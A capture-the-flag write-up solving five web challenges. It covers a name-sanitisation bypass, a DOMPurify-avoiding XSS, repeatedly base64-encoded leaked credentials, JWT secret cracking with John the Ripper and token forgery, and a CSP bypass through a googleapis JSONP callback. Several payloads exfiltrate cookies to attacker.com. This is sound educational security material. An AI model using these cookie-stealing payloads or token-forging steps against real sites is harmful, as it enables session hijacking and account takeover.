# Summary

- [Slow Down](#slow-down)
- [Calc](#calc)
- [Sprint User](#sprint-user)
- [Sprint Admin](#sprint-admin)
- [Keyboards Lovers](#keyboards-lovers)



# Slow Down

The challenge ressources are the IP leading to an API at http://188.245.212.74:10001/ and a zip containing the source code of the API.

The API is a simple Fastify server that allows us to set and get quotes. The quotes are stored in two diffrent ways:

- personalized quotes are stored in the `req.session.quotes` object and are only available to the user that set them
- default quotes are stored in the `defaultQuotes` object and are available to all users

Here are the API endpoints:

- `GET /default-quotes`: returns the names of the default quotes
- `GET /default-quotes/:quoteName`: returns the default quote with the name `quoteName`
- `GET /personalized-quotes`: returns all the personalized quotes for the user
- `POST /personalized-quotes`: sets a personalized quote for the user. The request body must be a JSON object with the following fields:
  - `name`: the name of the quote (must be unique)
  - `quote`: the quote itself (must be a string)

The flag is located in the `defaultQuotes` object as the `flag` quote. The `defaultQuotes` object is defined as follows:

```js
const flag = process.env.FLAG ?? "ping{FAKE}";

const defaultQuotes = {
	flag,
	believing:
		"Believe in yourself... or just gaslight yourself into confidence. Same thing.",
	procrastination:
		"The only way to do great work is to procrastinate until the fear of failure is stronger than your laziness.",
	success:
		"Success is not how high you have climbed, but how well you dodged responsibilities on the way up.",
	crypto:
		"Do what you can, with what you have, where you are... unless it's a crypto investment. Then rethink.",
	shots:
		"You miss 100% of the shots you don't take, but at least you didn't airball on live TV.",
};
```

We cannot see the flag here, we'll need to find a way to get it from the server.

## Exploit

Let's take a look at the `POST /personalized-quotes` endpoint:

```js
fastify.post("/personalized-quotes", async (req, reply) => {
	const { name, value } = req.body;
	if (!name || typeof name !== "string" || name.length > 50) {
		return reply.status(400).send({ error: "Invalid input" });
	}

	if (!req.session.quotes) {
		req.session.quotes = {};
	}

	if (defaultQuotes[name]) {
		return reply.status(400).send({ error: "Already exists in default" });
	}

	const sanitizedName = name.replace(/[^a-zA-Z0-9 ]/g, "");
	if (value) {
		req.session.quotes[sanitizedName] = value;
		return reply.send({ updated: req.session.quotes[sanitizedName] });
	}
	return reply.send({
		retrieved:
			req.session.quotes[sanitizedName] ?? defaultQuotes[sanitizedName],
	});
});
```

A few details in the code that are important to note:
- We cannot override default quotes with personalized quotes
    - If we try to set a personalized quote with the same name as a default quote, it will return an error
- The server do not want any special characters in the quote name
    - It will sanitize the name to remove special characters, then check again if the name is already taken
        - If it is, it will return the existing quote

So, all we need to do is try to set a personalized quote with a name which is not `flag` but will be normalized to `flag`.
- For example, we can set a quote with the name `flag{}`. The server will sanitize the name to `flag` and return the existing quote with the name `flag`.

Let's try it out:

```bash	
curl --location 'http://188.245.212.74:10001/personalized-quotes' \
--header 'Content-Type: application/json' \
--data '{
    "name": "flag{}"
}'
```

Give the following response:

```json
{
	"retrieved" : "ping{fastify-more-like-slowify-hehe-anMtYW5keQ==}"
}
```

flag: *ping{fastify-more-like-slowify-hehe-anMtYW5keQ==}*

---

# Calc

The challenge is a simple calculator website with, once again, the source code provided.

The calculator allows us to do basic operations: add, subtract, multiply and divide.

Trying other things will display an error message:

```
you can't use anything else than numbers,
whitespaces, +, -, ^, / and *. Unfortunately
due to some hackers, we had to limit our great calculator..
```

The site architecture is a bit weird, for the error message to be displayed we are juste redirected to `/?err=[Error message]`. Then the page will query the server that will sanitize the error message and return it.

The sanitization is done using DOMPurify, which is pretty solid. Let's take a look at the code to find another way to exploit it.

## Exploit

We find an interesting endpoint on the server:

```js
fastify.get("/test", async (req, reply) => {
	reply.type("text/html").send(req.query?.html ?? "req query html empty");
});
```

This endpoint will return the `html` query parameter as it is, without any sanitization. We can use this to inject a script that will send the flag to us:

```js
location = "http://attacker.com?" + document.cookie;
```

Which is a classic simple XSS payload.

To make it work, we need to make the bot execute the payload. We can just report an error to the bot to make it check the URL and execute the payload.

Let's just report the relative path:
```
test?html=<img%20src=x%20onerror="location='//attacker.com?c='%2Bdocument['cookie']">
```

Then, our exfiltration server will receive the cookie with the flag:

![flag exfiltration](calc_flag.png)

flag: *ping{cH4r53tt1ng_l1k3-4-Pr0-f211c8998abab934e26d4c2164dc5388}*

---

# Sprint User

The website is just a presentation about basic things in python.

It has a feature to upload some files, accessible with the `/download?filename=[filename]` endpoint.

The goal is to login as the user `KevinM`.

## Exploit

After some researchs, the website do not seem to have injection point. But I found the file `/download?filename=secret`.

The file has no extension and opening it in a text editor gives us a very long (368249 characters) in a base64 string format.

Trying to decode it gives us a similar string: Also a long string and visibly encoded in base64.

I then understood it is juste something base64 encoded a loooot of times.

After way to many decoding, we get the string:

```
{
  "username": "KevinM",
  "password": "^32i6;xqOFYkqg$l=wq^8-?jO^SIpT"
}
```

We can now login as `KevinM` with the password `^32i6;xqOFYkqg$l=wq^8-?jO^SIpT`.

flag: *CTF{L0g1n_M4st3r_2025}*

---

# Sprint Admin

The challenge uses the same website as the previous one.

The goal is now to login as the admin user.

We got another resource: a wordlist...

## Exploit

Once logged in as `KevinM`, we cannot see the admin panel. But we can see that the `/admin` page exists.

By looking at the cookies, we can see a cookie named `token` with the value:
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IktldmluTSIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNzQyNzQwNzQzLCJleHAiOjE3NDI3NDQzNDN9.Uj-d0Kxz1x8cBRqh1MSZb2886CyG0I1NoYmVJZRFOS8
```

It's format looks like a JWT token (`eyJ[...].[eyJ[...].[...]`) so let's try to decode it.

We can use [jwt.io](https://jwt.io/) to decode it, giving:

- header:
```
{
  "alg": "HS256",
  "typ": "JWT"
}
```
- payload:
```
{
  "username": "KevinM",
  "role": "user",
  "iat": 1742740743,
  "exp": 1742744343
}
```

Trying to modify the payload to change the role to `admin` and the username to `admin` will not work, we need to sign the token with the same HMAC secret as the server.

But we can try to find the secret using JohnTheRipper, giving it the token and the wordlist.

```bash
┌──(kali㉿kali)-[~]
└─$ john jwt.john --wordlist=Desktop/secrets.txt
Using default input encoding: UTF-8
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 256/256 AVX2 8x])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
secret123456     (?)     
1g 0:00:00:00 DONE (2025-03-23 10:41) 33.33g/s 33400p/s 33400c/s 33400C/s youJustCantCrackThis..mommy
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

We got the secret: `secret123456`.

Let's use it to craft and sign our token with the payload:
```
{
  "username": "admin",
  "role": "admin",
  "iat": 1742740743,
  "exp": 1742744343
}
```

Once we have the token, we can use it to access the `/admin` page and get the flag:

![admin pannel](sprint_adm_pannel.png)

flag: *ping{Spr1n7_T3ch_@dm1n_fl@G}*

---

# Keyboards Lovers

The challenge is a simple website that allows us to post, see and create keyboards.

3 keyboards are already present, but by looking at the source code we can see that 4 keyboards are present in the database.

The last one contains the flag in the `description` field but is not approved so only the admin can see it.

## Technical details

By trying some payloads I saw that the description field is not sanitized and allows us to inject HTML and JS code.

However, an XSS won't work so easily because of the very restrictive CSP policy:

```
default-src 'none'; script-src https://*.googleapis.com 'sha256-FlG9O9q1cgn5OYucapSvUz43B/tZq3UVDljeyRiVWvs='; style-src https://cdn.jsdelivr.net https://*.googleapis.com 'unsafe-inline'; img-src 'self'; connect-src 'self';font-src https://fonts.gstatic.com; form-action 'self'; block-all-mixed-content;
```

To make it short: The website do not allow any form of inline script, even in other tags like `img` or `style`. The only allowed script is the one from the google API, which is used to load the fonts.

## Vulnerability

The mistake here is that the CSP policy use the domain `https://*.googleapis.com` because it needs to load resources from `https://fonts.googleapis.com` and `https://ajax.googleapis.com`. But the wildcard `*` allows us to load any script from any subdomain of `googleapis.com`.

The trick I found is to use the `https://www.googleapis.com/customsearch/v1` endpoint to load our script. This endpoint is normally used to search for ressources on the google API.

By using the `callback` parameter, we can tell the API which function we want it to call after the query, using the format:

```
GET https://www.googleapis.com/customsearch/v1?callback=$CALLBACK

response -->

// API Callback
$CALLBACK($RESPONSE)
```

The `callback` parameter is checked but not sanitized, and will use the same formet even if the callback is considered invalid.

By leaving a trailing variable declaration in the callback, we can capture the response instead of passing it as a parameter, resulting in a syntactically valid JS code.

Example:

- Payload:
```js
let cookie = document.cookie;
alert(cookie);
// let foo= // Don't forget this in the callback
```

Url encoded, it will look like this:

```
GET https://www.googleapis.com/customsearch/v1?callback=let%20cookie=document.cookie;alert(cookie);let%20foo="

response -->

// API callback
let cookie=document.cookie;alert(cookie);let foo=(RESPONSE)
```

Which is a valid JS code, hosted on a trusted domain ^^

## Exploit

The timing here is pretty hard because the bot does, in the following order:
- Open the page
- Set it's admin cookie
- Refresh the page
- Wait 3 seconds
- Click on the approve button
- Wait 6 seconds
- Leave the page

As seen in the code:

```python
def approve_keyboard(keyboard_id):
    options = webdriver.ChromeOptions()
    options.add_argument('--headless')
    options.add_argument('--no-sandbox')
    options.add_argument('--disable-gpu')
    options.add_argument('--disable-extensions')
    driver = webdriver.Chrome(options=options)
    driver.get(f'http://localhost:5000/keyboard/{keyboard_id}')
    driver.add_cookie({'name': 'auth', 'value': get_my_key()})
    driver.refresh()
    sleep(3)
    driver.find_element('id', 'approve_btn').click()
    sleep(6)
    driver.close()
```

So a payload that activates at the page load will not work because the cookie won't be set yet.

And adding a delay will not work because of the python sleep.

Our best solution here is to use it's own clicks against him.

By setting up our payload to run only when the approve button is clicked, we are sure it will be executed after the cookie is set and while the bot's web driver is active.

The `approve_btn` button being after the injection point (the description field), we cannot access it directly because our script will be loaded before the button is created. I think the `defer` could work but I had an easier solution: Create my own `approve_btn`.

The payload for this would be:

```html
<button id="approve_btn" type="button"></button>
<script>
    document.getElementById('approve_btn').onclick= () => {
        location.href='https://attacker.com?c='+btoa(document.cookie);
    }
</script>
```

Using `www.googleapis.com/customsearch/v1` gives us the final payload:

```html
<button id="approve_btn" type="button"></button>
<script src="https://www.googleapis.com/customsearch/v1?callback=document.getElementById('approve_btn').onclick=function(){location.href='https://attacker.com?c='%2Bbtoa(document.cookie);};let%20foo=" ></script>
```

Then we can just submit the form with this payload as the description and wait for the bot to approve it.

The admin cookie will be sent to our server and we can use it to get the `/keyboards/4` page and get the flag.

![Keyboard 4](kbl_flag.png)

flag: *pingCTF{1_0n1y_u53_4_m0u53_4nyw4y}*